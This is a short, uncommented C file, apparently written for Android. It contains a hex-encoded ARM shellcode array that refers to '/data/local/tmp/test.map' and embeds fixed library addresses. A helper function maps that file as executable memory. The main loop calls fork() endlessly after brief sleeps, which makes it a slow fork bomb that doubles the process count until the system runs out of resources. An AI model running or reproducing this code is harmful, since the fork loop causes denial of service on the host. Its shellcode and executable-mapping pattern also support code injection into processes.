#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>


int my_sleep(int count){
	printf("(%d)sleeping...\n", count);
	sleep(3);
	count += 1;
	return count;
}

void map_it(){
	int fd;
	int *map;
	char *file = "/data/local/tmp/test.map";
	fd = open(file, O_RDONLY);
	map = mmap(0, 1024, PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0);
	close(fd);
	return;

}

char sc[] = "\x10\x40\x2d\xe9\x08\xd0\x4d\xe2\x50\x00\x8f\xe2\x40\x50\x9f\xe5"
"\x35\xff\x2f\xe1\x00\x30\xb0\xe3\x80\x10\xb0\xe3\x00\x40\xb0\xe1"
"\x81\x11\xb0\xe1\x00\x00\x8d\xe5\x04\x30\x8d\xe5\x05\x20\xb0\xe3"
"\x01\x30\xb0\xe3\x00\x00\xb0\xe3\x1c\x50\x9f\xe5\x35\xff\x2f\xe1"
"\x04\x00\xb0\xe1\x0c\x50\x9f\xe5\x35\xff\x2f\xe1\x08\xd0\x8d\xe2"
"\x10\x80\xbd\xe8\xb1\x32\xd1\xaf\x90\xdc\xd0\xaf\x65\x32\xd1\xaf"
"\x2f\x64\x61\x74\x61\x2f\x6c\x6f\x63\x61\x6c\x2f\x74\x6d\x70\x2f"
"\x74\x65\x73\x74\x2e\x6d\x61\x70\x00";

int main(int argc, char **argv)
{
	//map_it();

	int count = 0;

	LOOPSTART:
	while(1){
		count = my_sleep(count);
		if (count > 1) break;
	}
	fork();
	count = 0;
	goto LOOPSTART;


	return 0;
}

